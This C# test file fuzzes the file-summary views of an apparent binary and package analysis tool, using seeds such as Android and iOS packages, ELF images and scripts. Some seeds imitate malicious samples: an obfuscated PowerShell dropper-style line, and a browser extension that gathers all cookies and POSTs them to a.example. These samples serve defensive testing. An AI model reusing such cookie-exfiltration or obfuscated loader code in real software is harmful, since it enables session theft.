using System.Text;
using Corvus.Core;
using Corvus.Native.Elf;
using Corvus.Services.Analysis;
using Corvus.Tests.NativeFormats;

namespace Corvus.Tests;

/// <summary>summarize_file views on damaged files answer, return null or throw a tool error.</summary>
public sealed class FileViewFuzzTests : IDisposable
{
    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private void Fuzz(IFileSummaryView view, string name, int iterations, params byte[][] seeds)
    {
        // A folder of its own: views that look beside the file (Wasm glue, bundle folders) find nothing there.
        var path = Path.Combine(Directory.CreateDirectory(_dir.File(view.Name)).FullName, name);
        var failures = new List<string>();
        foreach (var seed in seeds)
            failures.AddRange(FormatFuzz.Run(seed, b =>
            {
                // Some views read the file again from its path.
                File.WriteAllBytes(path, b);
                try { view.Inspect(new FileInput(path, b, Blob.Identify(b)) { Options = new FileViewOptions(view.Name) }, default); }
                catch (ToolError) { }
            }, iterations));
        Assert.True(failures.Count == 0, $"view={view.Name}: " + string.Join("\n", failures.Take(10)));
    }

    [Fact]
    [FuzzEntry(typeof(AndroidFileView))]
    public void Fuzzed_Android_packages_never_throw_past_a_tool_error() => Fuzz(new AndroidFileView(), "app.apk", 300, AndroidSamples.Apk());

    [Fact]
    [FuzzEntry(typeof(AppleFileView))]
    public void Fuzzed_iOS_packages_never_throw_past_a_tool_error()
    {
        var plist = Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><plist version=\"1.0\"><dict><key>CFBundleIdentifier</key><string>com.example.zoo</string>" +
            "<key>CFBundleExecutable</key><string>Zoo</string><key>CFBundleShortVersionString</key><string>1.2</string></dict></plist>");
        var ipa = ContainerFixtures.Zip(("Payload/Zoo.app/Info.plist", plist), ("Payload/Zoo.app/Zoo", FormatWriterTests.SampleMachO().Build()));
        Fuzz(new AppleFileView(), "Zoo.ipa", 300, ipa);
    }

    [Fact]
    [FuzzEntry(typeof(ElectronFileView))]
    public void Fuzzed_asar_archives_and_executables_never_throw_past_a_tool_error()
    {
        var (asar, _) = AsarWriter.Build([AsarWriter.Text("package.json", """{"name":"demo","main":"main.js"}"""), AsarWriter.Text("main.js", "new BrowserWindow({ webPreferences: { nodeIntegration: true } })")]);
        Fuzz(new ElectronFileView(), "app.asar", 300, asar);
        Fuzz(new ElectronFileView(), "app.exe", 300, ElectronFixtures.Executable(ElectronFixtures.IntegrityJson(new string('0', 64))));
    }

    [Fact]
    [FuzzEntry(typeof(GoFileView))]
    public void Fuzzed_Go_binaries_never_throw_past_a_tool_error()
    {
        var elf = new ElfWriter
        {
            Machine = ElfWriter.EmX64, Type = 2, Base = 0x400000, Entry = ElfWriter.TextRva, Text = [0xC3], Hash = ElfWriter.HashKind.None,
            DataSectionName = ".go.buildinfo", Data = GoBuildInfoTests.Inline(),
        }.Build();
        Fuzz(new GoFileView(), "gobin", 300, elf);
    }

    [Fact]
    [FuzzEntry(typeof(NativeFileView))]
    public void Fuzzed_native_images_never_throw_past_a_tool_error() => Fuzz(new NativeFileView(), "lib.bin", 300, NativePeTests.KitchenSink(true), FormatWriterTests.SampleElf().Build(), FormatWriterTests.SampleMachO().Build());

    [Fact]
    [FuzzEntry(typeof(RawCodeFileView))]
    public void Fuzzed_raw_code_never_throws_past_a_tool_error()
    {
        // 8 KiB of arm64 frames (stp x29, x30; mov x29, sp; ret) with a string after each, so the view finds code and a base.
        var code = new List<byte>();
        while (code.Count < 8192)
        {
            foreach (uint word in new uint[] { 0xA9BF7BFD, 0x910003FD, 0xD65F03C0 }) code.AddRange(BitConverter.GetBytes(word));
            code.AddRange(Encoding.ASCII.GetBytes("format string\0\0\0"));
        }
        Fuzz(new RawCodeFileView(), "flash.bin", 200, [.. code]);
    }

    [Fact]
    [FuzzEntry(typeof(PlistFileView))]
    public void Fuzzed_plists_never_throw_past_a_tool_error() => Fuzz(new PlistFileView(), "Info.plist", 500,
        Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><plist><dict><key>a</key><array><integer>1</integer><data>AAEC</data></array></dict></plist>"));

    [Fact]
    [FuzzEntry(typeof(ProtobufFileView))]
    public void Fuzzed_protobuf_descriptors_never_throw_past_a_tool_error() => Fuzz(new ProtobufFileView(), "demo.pb", 500, ProtoWriter.Demo());

    [Fact]
    [FuzzEntry(typeof(PageFileView), typeof(Services.Web.SavedPage))]
    public void Fuzzed_saved_pages_never_throw_past_a_tool_error() => Fuzz(new PageFileView(), "page.html", 300,
        Encoding.UTF8.GetBytes("<!doctype html><!-- saved from url=(0024)https://a.example.com/ --><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-a' 'sha256-x'\">" +
            "<script nonce=a>go()</script><script src=\"data:text/javascript;base64,Z28oKQ==\" integrity=\"sha256-x sha384-y\"></script>" +
            "<form method=post action=https://b.example.net/x><input type=password></form><meta http-equiv=refresh content=\"0;url=https://c.example/\"><script>location.href='https://d.example/'</script>" +
            "<script type=importmap>{\"imports\":{\"a\":\"https://b.example.net/a.js\"},\"scopes\":{\"/s/\":{\"a\":\"./a.js\"}}}</script>"));

    [Fact]
    [FuzzEntry(typeof(ScriptFileView))]
    public void Fuzzed_scripts_never_throw_past_a_tool_error() => Fuzz(new ScriptFileView(), "drop.ps1", 120,
        Encoding.UTF8.GetBytes("& ( $PSHomE[4]+$pShome[34]+'x') (('1wb'+'u = 7Xkhttp://'+'ex'+'ample.com/cor'+'vus7Xk').REPLAce(([ChAR]49+[ChAR]119+[ChAR]98),'$').REPLAce('7Xk',[String][ChAR]39))"));

    [Fact]
    [FuzzEntry(typeof(Corvus.Services.Web.Scripts.ScriptEncoding))]
    public void Fuzzed_encoded_scripts_never_throw_past_a_tool_error() => Fuzz(new ScriptFileView(), "drop.vbe", 200,
        Encoding.UTF8.GetBytes(ScriptEncodingTests.Encode("x = Chr(72) & Chr(105)\r\nIf a < b Then y = \"me@host\"\r\n")));

    [Fact]
    [FuzzEntry(typeof(PackageFileView), typeof(Corvus.Services.Web.Packages.CrxHeader))]
    public void Fuzzed_browser_and_editor_extensions_never_throw_past_a_tool_error()
    {
        var zip = ContainerFixtures.Zip(("manifest.json", Encoding.UTF8.GetBytes("""{"manifest_version":3,"name":"x","version":"1","permissions":["cookies"],"host_permissions":["<all_urls>"],"background":{"service_worker":"b.js"}}""")),
            ("b.js", Encoding.UTF8.GetBytes("chrome.cookies.getAll({}, c => fetch('https://a.example/c', {method:'POST'}));")));
        Fuzz(new PackageFileView(), "ext.crx", 150, PackageReviewTests.Crx3(zip, out _));
        Fuzz(new PackageFileView(), "pkg.vsix", 150, ContainerFixtures.Zip(("extension/package.json", Encoding.UTF8.GetBytes("""{"name":"a","publisher":"b","main":"./e.js","activationEvents":["*"]}""")),
            ("extension/e.js", Encoding.UTF8.GetBytes("exports.activate=()=>{}"))));
    }

    [Fact]
    [FuzzEntry(typeof(SqliteRecoverFileView))]
    public void Fuzzed_databases_with_deleted_rows_never_throw_past_a_tool_error() => Fuzz(new SqliteRecoverFileView(), "msg.db", 300,
        NativeSqlite.Build("CREATE TABLE msg(id INTEGER PRIMARY KEY, body TEXT);", "INSERT INTO msg(body) VALUES ('one'), ('two'), ('three');", "DELETE FROM msg WHERE id = 2;"));

    [Fact]
    [FuzzEntry(typeof(WasmFileView))]
    public void Fuzzed_Wasm_modules_never_throw_past_a_tool_error() => Fuzz(new WasmFileView(), "app.wasm", 500, WasmTests.Sample());
}
